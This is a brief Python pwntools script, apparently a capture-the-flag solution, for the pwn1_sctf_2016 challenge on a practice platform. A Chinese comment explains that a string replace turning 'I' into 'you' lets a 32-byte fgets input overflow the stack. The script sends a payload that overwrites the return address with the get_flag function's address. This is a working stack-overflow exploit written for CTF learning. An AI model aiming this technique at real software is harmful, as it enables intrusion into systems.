from pwn import *

'''
    双击vuln()函数查看源码，分析后发现fgets()函数限制输入32个字节到变量s中，乍一看并没有超出可用栈大小。
    第19行的replace()函数会把输入的I替换成you，1个字符变成3个字符。 并且在第27行会对原来的s变量重新赋值。
    
    总结
        这道题目的情况是多了个替换字符的函数，使得一个I在存储中变为you，一个字节变为三字节，这时候需要根据情况确定多少字符使得栈溢出。

'''


def pwn1_sctf_2016(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/pwn1_sctf_2016'):
    print('pwn1_sctf_2016 start')
    target = remote('node4.buuoj.cn', 26091)
    target_elf = ELF(file_name)

    get_flag_ptr = p32(target_elf.symbols['get_flag'])

    payload = b'I' * 20 + b'A' * 4
    payload += get_flag_ptr

    target.sendline(payload)

    print(target.recvline().decode('utf-8'))

    print('pwn1_sctf_2016 end')


if __name__ == '__main__':
    pwn1_sctf_2016()
